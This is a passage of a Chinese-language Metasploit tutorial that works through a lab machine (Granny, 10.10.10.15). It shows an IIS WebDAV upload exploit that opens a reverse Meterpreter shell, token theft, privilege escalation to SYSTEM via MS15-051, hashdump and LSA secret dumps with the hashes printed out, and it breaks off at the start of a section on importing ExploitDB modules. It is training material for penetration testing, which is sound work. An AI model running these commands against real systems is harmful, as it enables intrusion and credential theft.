10.10.10.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set LHOST tun0</span><br><span class="line"></span><br><span class="line">LHOST =&gt; tun0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.26:4444 </span><br><span class="line">[*] Checking /metasploit28857905.asp</span><br><span class="line">[*] Uploading 612435 bytes to /metasploit28857905.txt...</span><br><span class="line">[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...</span><br><span class="line">[*] Executing /metasploit28857905.asp...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.15</span><br><span class="line">[*] Deleting /metasploit28857905.asp (this doesn&#x27;t always work)...</span><br><span class="line">[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>我们有 Meterpreter shell。但是，请仔细查看上面的输出。此时我们可以看到目标系统上存在一个<code>.asp</code>名为 exists 的文件。<code>metasploit28857905</code>一旦获得 Meterpreter shell，如前所述，它将驻留在内存中。因此，不需要该文件，并且尝试删除<code>msfconsole</code>，但由于访问权限而失败。留下这样的痕迹对攻击者没有好处，并且会造成巨大的责任。</p><p>从系统管理员的角度来看，找到与此名称类型相匹配的文件或它的轻微变体可以证明有助于在其轨道中间停止攻击。如上所述，针对文件名或签名的正则表达式匹配甚至不允许攻击者在被正确配置的安全措施切断之前生成 Meterpreter shell。</p><p>我们继续我们的探索。在尝试查看我们在哪个用户上运行时，我们收到一条访问被拒绝的消息。我们应该尝试将我们的进程迁移到具有更多权限的用户。</p><h4 id="MSF-Meterpreter-迁移"><a href="#MSF-Meterpreter-迁移" class="headerlink" title="MSF - Meterpreter 迁移"></a>MSF - Meterpreter 迁移</h4><p> MSF - Meterpreter 迁移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">[-] 1055: Operation failed: Access is denied.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System                                                          </span><br><span class="line"> 216   1080  cidaemon.exe                                                    </span><br><span class="line"> 272   4     smss.exe                                                        </span><br><span class="line"> 292   1080  cidaemon.exe                                                    </span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line"></span><br><span class="line"> 1712  396   alg.exe                                                         </span><br><span class="line"> 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe</span><br><span class="line"> 1920  396   dllhost.exe                                                     </span><br><span class="line"> 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe</span><br><span class="line"> 2312  592   wmiprvse.exe                                                    </span><br><span class="line"> 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe</span><br><span class="line"> 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe</span><br><span class="line"> 4076  1080  cidaemon.exe                                                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; steal_token 1836</span><br><span class="line"></span><br><span class="line">Stolen token with username: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\NETWORK SERVICE</span><br></pre></td></tr></table></figure><p>现在我们已经在系统中至少建立了一些权限级别，是时候升级该权限了。因此，我们四处寻找任何有趣的东西，并在该<code>C:\Inetpub\</code>位置找到一个有趣的文件夹，名为<code>AdminScripts</code>. 然而，不幸的是，我们无权阅读其中的内容。</p><h4 id="MSF-与目标交互"><a href="#MSF-与目标交互" class="headerlink" title="MSF - 与目标交互"></a>MSF - 与目标交互</h4><p>我们可以很容易地决定运行本地漏洞利用建议模块，将其附加到当前活动的 Meterpreter 会话。为此，我们将当前 Meterpreter 会话置于后台，搜索我们需要的模块，并将 SESSION 选项设置为 Meterpreter 会话的索引号，将模块绑定到它。</p><h4 id="MSF-会话处理"><a href="#MSF-会话处理" class="headerlink" title="MSF - 会话处理"></a>MSF - 会话处理</h4><p> MSF - 会话处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; bg</span><br><span class="line"></span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; search local_exploit_suggester</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; use 0</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1</span><br><span class="line"></span><br><span class="line">SESSION =&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.15 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.15 - 34 exploit checks are being tried...</span><br><span class="line">nil versions are discouraged and will be deprecated in Rubygems 4</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><br></pre></td></tr></table></figure><p>运行侦察模块为我们提供了多种选择。通过每个单独的一个，我们降落在<code>ms15_051_client_copy_image</code>条目上，这被证明是成功的。这个漏洞利用让我们直接进入 root shell，让我们完全控制目标系统。</p><h4 id="MSF——特权升级"><a href="#MSF——特权升级" class="headerlink" title="MSF——特权升级"></a>MSF——特权升级</h4><p> MSF——特权升级</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms15_051_client_copy_images</span><br><span class="line"></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms15_051_client_copy_image):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set session 1</span><br><span class="line"></span><br><span class="line">session =&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set LHOST tun0</span><br><span class="line"></span><br><span class="line">LHOST =&gt; tun0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.26:4444 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 844 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 844...</span><br><span class="line">[*] Injecting exploit into 844...</span><br><span class="line">[*] Exploit injected. Injecting payload into 844...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.15</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>从这里开始，我们可以继续使用 Meterpreter 的大量功能。例如，提取哈希值、模拟我们想要的任何进程等等。</p><h4 id="MSF-转储哈希"><a href="#MSF-转储哈希" class="headerlink" title="MSF - 转储哈希"></a>MSF - 转储哈希</h4><p> MSF - 转储哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::</span><br><span class="line">ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::</span><br><span class="line">IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::</span><br><span class="line">Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping SAM</span><br><span class="line">Domain : GRANNY</span><br><span class="line">SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line">Local SID : S-1-5-21-1709780765-3897210020-3926566182</span><br><span class="line"></span><br><span class="line">SAMKey : 37ceb48682ea1b0197c7ab294ec405fe</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf</span><br><span class="line">  Hash NTLM: d6908f022af0373e9e21b8a241c86dca</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : SUPPORT_388945a0</span><br><span class="line">  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6</span><br><span class="line"></span><br><span class="line">RID  : 000003eb (1003)</span><br><span class="line">User : IUSR_GRANPA</span><br><span class="line">  Hash LM  : a274b4532c9ca5cdf684351fab962e86</span><br><span class="line">  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88</span><br><span class="line"></span><br><span class="line">RID  : 000003ec (1004)</span><br><span class="line">User : IWAM_GRANPA</span><br><span class="line">  Hash LM  : 95d112c4da2348b599183ac6b1d67840</span><br><span class="line">  Hash NTLM: a97f39734c21b3f6155ded7821d04d16</span><br><span class="line"></span><br><span class="line">RID  : 000003ef (1007)</span><br><span class="line">User : ASPNET</span><br><span class="line">  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b</span><br><span class="line">  Hash NTLM: edc0d5506804653f58964a2376bbd769</span><br><span class="line"></span><br><span class="line">RID  : 000003f1 (1009)</span><br><span class="line">User : Lakis</span><br><span class="line">  Hash LM  : f927b0679b3cc0e192410d9b0b40873c</span><br><span class="line">  Hash NTLM: 3064b6fc432033870c6730228af7867c</span><br></pre></td></tr></table></figure><h4 id="MSF-Meterpreter-LSA-秘密转储"><a href="#MSF-Meterpreter-LSA-秘密转储" class="headerlink" title="MSF - Meterpreter LSA 秘密转储"></a>MSF - Meterpreter LSA 秘密转储</h4><p> MSF - Meterpreter LSA 秘密转储</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lsa_dump_secrets</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping LSA secrets</span><br><span class="line">Domain : GRANNY</span><br><span class="line">SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line"></span><br><span class="line">Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )</span><br><span class="line">Domain name : HTB</span><br><span class="line"></span><br><span class="line">Policy subsystem is : 1.7</span><br><span class="line">LSA Key : ada60ee248094ce782807afae1711b2c</span><br><span class="line"></span><br><span class="line">Secret  : aspnet_WP_PASSWORD</span><br><span class="line">cur/text: Q5C&#x27;181g16D&#x27;=F</span><br><span class="line"></span><br><span class="line">Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV</span><br><span class="line">cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 </span><br><span class="line"></span><br><span class="line">Secret  : DPAPI_SYSTEM</span><br><span class="line">cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 </span><br><span class="line">    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63</span><br><span class="line">    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63</span><br><span class="line"></span><br><span class="line">Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75</span><br><span class="line">cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line"></span><br><span class="line">Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588</span><br><span class="line">cur/hex : 00 f2 d1 31 e2 11 d3 01 </span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$&#123;6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A&#125;</span><br><span class="line">cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f </span><br><span class="line">old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 </span><br><span class="line"></span><br><span class="line">Secret  : NL$KM</span><br><span class="line">cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f </span><br><span class="line"></span><br><span class="line">Secret  : SAC</span><br><span class="line"></span><br><span class="line">Secret  : SAI</span><br><span class="line"></span><br><span class="line">Secret  : SCM:&#123;148f1a14-53f3-4074-a573-e1ccd344e1d0&#125;</span><br><span class="line"></span><br><span class="line">Secret  : SCM:&#123;3D14228D-FBE1-11D0-995D-00C04FD919C1&#125;</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Alerter / service &#x27;Alerter&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_ALG / service &#x27;ALG&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_aspnet_state / service &#x27;aspnet_state&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Dhcp / service &#x27;Dhcp&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Dnscache / service &#x27;Dnscache&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_LicenseService / service &#x27;LicenseService&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_LmHosts / service &#x27;LmHosts&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_MSDTC / service &#x27;MSDTC&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_RpcLocator / service &#x27;RpcLocator&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_RpcSs / service &#x27;RpcSs&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_stisvc / service &#x27;stisvc&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_TlntSvr / service &#x27;TlntSvr&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_WebClient / service &#x27;WebClient&#x27; with username : NT AUTHORITY\LocalService</span><br></pre></td></tr></table></figure><p>从这一点来看，如果机器连接到更广泛的网络，我们可以使用这个战利品在系统中旋转，获得对内部资源的访问权限，并在网络的整体安全态势薄弱的情况下冒充具有更高访问权限的用户.</p><h2 id="编写和导入模块"><a href="#编写和导入模块" class="headerlink" title="编写和导入模块"></a>编写和导入模块</h2><p>要安装任何已经被其他用户移植过来的新 Metasploit 模块，可以选择<code>msfconsole</code>从终端更新它们，这将确保所有最新的漏洞、辅助工具和功能都将安装在最新版本的<code>msfconsole</code>. 只要移植的模块被推送到 GitHub 上的主要 Metasploit-framework 分支，我们就应该更新到最新的模块。</p><p>但是，如果我们只需要一个特定的模块并且不想执行完整升级，我们可以下载该模块并手动安装。我们将专注于在 ExploitDB 中搜索现成可用的 Metasploit 模块，我们可以将这些模块直接导入到我们的<code>msfconsole</code>本地版本中。</p><p>在搜索自定义漏洞时，<a href="https://www.exploit-db.com/">ExploitDB是一个不错的选择。</a>我们可以使用标签来搜索每个可用脚本的不同利用场景。这些标签之一是<a href="https://www.exploit-db.com/?tag=3">Metasploit Framework (MSF)</a>，如果选中，将仅显示 Metasploit 模块格式中也可用的脚本。这些可以直接从 ExploitDB 下载并安装在我们本地的 Metasploit Framework 目录中，从那里可以在<code>msfconsole</code>.</p><p><img src="/img/METASPLOIT3.png"></p><p>假设我们想使用为 找到的漏洞利用程序<code>Nagios3</code>，它将利用命令注入漏洞。我们正在寻找的模块是<code>Nagios3 - &#39;statuswml.cgi&#39; Command Injection (Metasploit)</code>. 所以我们启动<code>msfconsole</code>并尝试搜索那个特定的漏洞利用，但我们找不到它。这意味着我们的 Metasploit 框架不是最新的，或者<code>Nagios3</code>我们正在寻找的特定漏洞利用模块不在 Metasploit 框架的官方更新版本中。</p><h4 id="MSF-搜索漏洞"><a href="#MSF-搜索漏洞" class="headerlink" title="MSF - 搜索漏洞"></a>MSF - 搜索漏洞</h4><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 